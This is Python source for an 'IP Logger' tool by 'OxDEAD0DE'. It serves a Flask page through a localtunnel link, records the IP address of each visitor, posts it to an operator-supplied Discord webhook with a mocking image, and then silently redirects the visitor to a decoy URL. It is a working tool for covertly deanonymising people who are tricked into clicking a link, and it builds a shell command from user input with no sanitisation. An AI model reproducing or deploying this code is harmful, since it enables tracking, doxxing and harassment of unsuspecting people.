from flask import Flask, request, redirect
from discord_webhook import DiscordWebhook, DiscordEmbed
import subprocess
import os

hacker = "\033[38;5;118m"
clear = "\033[0m"

def localtunnel(port, subdomain):
    result = f"lt --port {port} --subdomain {subdomain}"
    proc = subprocess.Popen(result, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
    for line in iter(proc.stdout.readline, b''):
        decoded = line.decode().strip()
        print(decoded)
        if "your url is:" in decoded:
            return decoded.split("your url is: ")[-1]

app = Flask(__name__)

def send(ip):
    wh = DiscordWebhook(url=webhook,username="OxDEAD0DE",avatar_url="https://tistory1.daumcdn.net/tistory/7253027/attach/20dbe180ac1f4e209a490aea82fdea9b")
    emb = DiscordEmbed(title="IP Logger by OxDEAD0DE")

    emb.add_embed_field(name="", value=ip)
    emb.set_image("https://media.tenor.com/_6-bilomoRMAAAAe/i-have-your-ip-address-your.png")

    wh.add_embed(emb)
    wh.execute()

@app.route("/")
def index():
    ip = request.environ.get("HTTP_X_FORWARDED_FOR", request.remote_addr)
    send(ip)
    return redirect(f"{redirects}")

def iplogger_main():
    global webhook, redirects, ports, subdomain
    webhook = input(f"[{hacker}+{clear}] Discord Webhook{hacker}:{clear} ")
    redirects = input(f"[{hacker}*{clear}] Redirect{hacker}:{clear} ")
    ports = input(f"[{hacker}+{clear}] Port{hacker}:{clear} ")
    subdomain = input(f"[{hacker}*{clear}] Subdomain{hacker}:{clear} ")

    url = localtunnel(ports, subdomain)
    if url:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(f"""
{hacker}
    ________  __  __            __           
   /  _/ __ \/ / / /_  ______  / /____  _____
   / // /_/ / /_/ / / / / __ \/ __/ _ \/ ___/ 
 _/ // ____/ __  / /_/ / / / / /_/  __/ /    
/___/_/   /_/ /_/\__,_/_/ /_/\__/\___/_/  
{clear}      
    [{hacker}+{clear}] version  {hacker}|{clear} 1.0
    [{hacker}+{clear}] Author   {hacker}|{clear} OxDEAD0DE
    [{hacker}*{clear}] Github   {hacker}|{clear} github.com/OxDEAD0DE
    [{hacker}*{clear}] Discord  {hacker}|{clear} kk1lly.cpp
              """)
        print(f"[{hacker}*{clear}] IP Logger {hacker}|{clear} {url}")
    else:
        print("sudo apt install nodejs npm")
        print("sudo npm install -g localtunnel")
        exit()

    app.run(port=int(ports))